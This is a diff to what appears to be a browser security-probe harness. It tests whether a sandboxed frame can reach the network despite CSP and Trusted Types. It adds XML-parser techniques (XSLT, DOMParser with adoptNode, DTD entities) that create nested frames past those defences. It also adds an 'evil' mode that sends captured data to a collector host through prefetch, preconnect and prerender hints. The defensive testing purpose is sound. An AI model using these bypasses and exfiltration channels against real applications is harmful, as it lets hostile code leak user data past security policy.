@@ -3,7 +3,10 @@
 // is all that stands between an opaque-origin frame and the network. Probes
 // every egress primitive. Findings: WebRTC (the one primitive NO directive
 // covers), and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381)
-// — probed by a kehto/web#393-mirror nested-context bypass battery.
+// — probed by a kehto/web#393-mirror nested-context bypass battery that now
+// also carries the XML-parser sinks (XSLT transformToFragment, XML-namespace
+// DOMParser+adopt, DTD-entity expansion) a factory-pin + Trusted Types layer
+// does not reach (ROADMAP finding 13, napplet/evil#5).
 const NX = 'https://evil.example.invalid/collect';
 
 function egressProbe(label, fire) {
@@ -230,9 +233,9 @@ const ATTACKS = [
   {
     id: 'webrtc-grandchild',
     name: 'WebRTC grandchild frame — fresh realm, no CSP reach',
-    target: 'nested-context lock (kehto/web#393 class: TT default policy + factory pins + byte scan)',
+    target: 'nested-context lock (kehto/web#393 class: TT default policy + factory pins + byte scan + XML-parser output scan)',
     severity: 'critical',
-    harm: 'No CSP directive reaches an about:srcdoc/about:blank grandchild: a napplet that mints a child frame gets a FRESH realm with a live RTCPeerConnection — even where the top napplet realm was neutered (kehto/web#381). Grandchild WebRTC egress with no recourse short of preventing nested contexts entirely; no webrtc CSP directive exists yet.',
+    harm: 'No CSP directive reaches an about:srcdoc/about:blank grandchild: a napplet that mints a child frame gets a FRESH realm with a live RTCPeerConnection — even where the top napplet realm was neutered (kehto/web#381). Grandchild WebRTC egress with no recourse short of preventing nested contexts entirely; no webrtc CSP directive exists yet. The battery mixes HTML string sinks and element factories with XML-parser sinks (XSLT transformToFragment, XML-namespace DOMParser+adopt, DTD-entity expansion) that a factory-pin + Trusted Types layer does not reach.',
     evilBrief: 'Mints a grandchild frame via the working creation vector and runs real STUN ICE gathering from inside that fresh realm — egress no top-realm neutering (#384/#386) can reach.',
     async demo() {
       const topRTC = typeof RTCPeerConnection === 'function';
@@ -308,6 +311,49 @@ const ATTACKS = [
       });
       attempt('object element', () => { const o = document.createElement('object'); o.setAttribute('data', 'data:text/html,' + encodeURIComponent(gcDoc(14))); container.appendChild(o); });
       attempt('embed element', () => { const e = document.createElement('embed'); e.setAttribute('src', 'data:text/html,' + encodeURIComponent(gcDoc(15))); container.appendChild(e); });
+      // XML-parser sinks (kehto/web#381 follow-up, napplet/evil#5) — a fresh
+      // vector class the three-layer #393-mirror (factory pins + TT default
+      // policy + static byte scan) does NOT reach: an XML parser builds the
+      // frame element without ever touching createElement/createElementNS or a
+      // TrustedHTML string sink, and adoptNode/transformToFragment move it into
+      // the live document. Each sets srcdoc via setAttribute on the parsed node
+      // (not a factory, not a TT sink), so only an output scan on
+      // adoptNode/importNode/transformToFragment closes them. Measured minting
+      // in Chromium 147, Firefox 148, WebKit 26.4.
+      const XHTML = 'http://www.w3.org/1999/xhtml';
+      attempt('XSLT transformToFragment', () => {
+        if (typeof XSLTProcessor !== 'function') throw new Error('no XSLTProcessor');
+        const XSL = 'http://www.w3.org/1999/XSL/Transform';
+        const xdoc = document.implementation.createDocument(XSL, 'xsl:stylesheet', null);
+        xdoc.documentElement.setAttribute('version', '1.0');
+        const tpl = xdoc.createElementNS(XSL, 'xsl:template'); tpl.setAttribute('match', '/');
+        // xsl:element name="iframe" emits the frame via the XSLT engine — the
+        // tag name is a string value, never a createElement argument.
+        const el = xdoc.createElementNS(XSL, 'xsl:element'); el.setAttribute('name', 'iframe');
+        const at = xdoc.createElementNS(XSL, 'xsl:attribute'); at.setAttribute('name', 'srcdoc'); at.textContent = gcDoc(16);
+        el.appendChild(at); tpl.appendChild(el); xdoc.documentElement.appendChild(tpl);
+        const proc = new XSLTProcessor(); proc.importStylesheet(xdoc);
+        const frag = proc.transformToFragment(document.implementation.createDocument(null, 'root', null), document);
+        container.appendChild(frag);
+      });
+      attempt('XHTML DOMParser+adopt', () => {
+        // prefixed-namespace XHTML parsed as application/xml, then adoptNode
+        const d = new DOMParser().parseFromString('<h:div xmlns:h="' + XHTML + '"><h:iframe/></h:div>', 'application/xml');
+        const ifr = d.getElementsByTagNameNS(XHTML, 'iframe')[0];
+        if (!ifr) throw new Error('no parsed frame node');
+        ifr.setAttribute('srcdoc', gcDoc(17));
+        container.appendChild(document.adoptNode(ifr));
+      });
+      attempt('DTD-entity XML', () => {
+        // the frame element arrives from DTD general-entity expansion
+        const inner = '<h:iframe xmlns:h=\'' + XHTML + '\'/>';
+        const ent = inner.replace(/</g, '&#60;').replace(/>/g, '&#62;');
+        const d = new DOMParser().parseFromString('<!DOCTYPE r [<!ENTITY e "' + ent + '">]><r>&e;</r>', 'application/xml');
+        const ifr = d.getElementsByTagNameNS(XHTML, 'iframe')[0];
+        if (!ifr) throw new Error('entity did not expand to a frame node');
+        ifr.setAttribute('srcdoc', gcDoc(18));
+        container.appendChild(document.adoptNode(ifr));
+      });
       // document.write is NOT executed: it destroys this probe UI (the
       // kehto/web#393 analysis classes it with the innerHTML TT string sink,
       // which the battery exercises above — same sink, same policy).
@@ -326,7 +372,7 @@ const ATTACKS = [
       if (framesLeft > 0) {
         return armed(framesLeft + ' nested context(s) minted but silent — assumed open (' + topNote + '). battery: ' + rec.join(' | '));
       }
-      return blocked('nested-context lock HELD — zero child contexts minted across all ' + rec.length + ' battery vectors (TT string sinks + factory pins + byte scan: the kehto/web#393 prevention class). document.write not executed (destroys the probe UI; same TT class as innerHTML). ' + topNote + '. battery: ' + rec.join(' | '));
+      return blocked('nested-context lock HELD — zero child contexts minted across all ' + rec.length + ' battery vectors (TT string sinks + factory pins + static byte scan, plus an adoptNode/transformToFragment output scan for the XML-parser sinks the three-layer #393-mirror misses). document.write not executed (destroys the probe UI; same TT class as innerHTML). ' + topNote + '. battery: ' + rec.join(' | '));
     },
     async evil() {
       const out = {};
@@ -366,30 +412,40 @@ const ATTACKS = [
     },
   },
   {
-    id: 'prefetch-hint',
-    name: 'prefetch / dns-prefetch hints',
-    target: 'no CSP directive governs prefetch',
+    id: 'resource-hints',
+    name: 'resource hints — prefetch / dns-prefetch / preconnect / prerender',
+    target: 'default-src \'none\' does not reliably govern resource hints',
     severity: 'low',
-    harm: 'Prefetch and dns-prefetch hint loads are not observable as fetches and not covered by connect-src — a covert egress/traffic-shaping channel.',
+    harm: 'Resource-hint loads are not observable as fetches from inside the frame and are not reliably governed by the napplet CSP. CSP3 ED (w3c/webappsec-csp@e3461f7) places prefetch/prerender under default-src, so a browser that lets them through under default-src \'none\' is non-conformant. prerender issues a real HTTP GET (Sec-Purpose: prefetch) in Chromium; preconnect opens a TCP connection (WebKit) or DNS+TCP (Chromium with network prediction); dns-prefetch resolves DNS (Chromium with prediction, Firefox with DNS prefetch enabled) — a covert egress / traffic-shaping channel per engine (see ROADMAP finding 15 for the table).',
+    evilBrief: 'Inserts prefetch, dns-prefetch, preconnect, and prerender hint links at the collector — point the collector at a local sink (http(s)/TCP/DNS) to OBSERVE the egress rather than assume it. prerender carries the captured summary in the query string of a real HTTP GET.',
     async demo() {
       const inserted = [];
-      const before = { ok: true };
-      for (const rel of ['prefetch', 'dns-prefetch']) {
+      // Local-sink mode: egress is observed OUTSIDE the frame (no in-frame
+      // violation/load event), so demo mode points the hints at the
+      // non-resolving NX host and stays honest — na, not armed.
+      for (const rel of ['prefetch', 'dns-prefetch', 'preconnect', 'prerender']) {
         const link = document.createElement('link');
         link.rel = rel;
         link.href = NX + '?ev=' + rel;
         document.head.appendChild(link);
         inserted.push(rel);
-        setTimeout(() => link.remove(), 1000);
+        setTimeout(() => { try { link.remove(); } catch (_) {} }, 1200);
       }
-      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event). CSP does not govern prefetch: treat the channel as open unless your platform blocks hints (Permissions-Policy / browser flags)');
+      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event, no error). CSP does not reliably govern resource hints: point the collector at a local sink to OBSERVE the egress (prerender → HTTP GET with Sec-Purpose; preconnect → TCP; dns-prefetch → DNS). Playwright\'s default context disables network prediction, so run the real Chromium channel with --enable-features=NetworkPrediction to see preconnect/dns-prefetch; prerender fires regardless. Per-engine table in ROADMAP finding 15.');
     },
     async evil() {
-      const link = document.createElement('link');
-      link.rel = 'prefetch';
-      link.href = state.collector + '?ev=prefetch-exfil&payload=' + encodeURIComponent(captureSummary().slice(0, 512));
-      document.head.appendChild(link);
-      return { result: 'prefetch hint exfil dispatched to ' + state.collector };
+      const summary = encodeURIComponent(captureSummary().slice(0, 512));
+      const fired = [];
+      for (const rel of ['prefetch', 'dns-prefetch', 'preconnect', 'prerender']) {
+        const link = document.createElement('link');
+        link.rel = rel;
+        // prerender/prefetch carry the payload in a real request URL; preconnect/
+        // dns-prefetch only reach the host (TCP/DNS), so the host itself is the signal.
+        link.href = state.collector + '?ev=' + rel + '-exfil&payload=' + summary;
+        document.head.appendChild(link);
+        fired.push(rel);
+      }
+      return { result: 'resource-hint exfil dispatched to ' + state.collector + ' (' + fired.join(', ') + ') — observe at the sink; prerender carries the payload in an HTTP GET' };
     },
   },
 ];
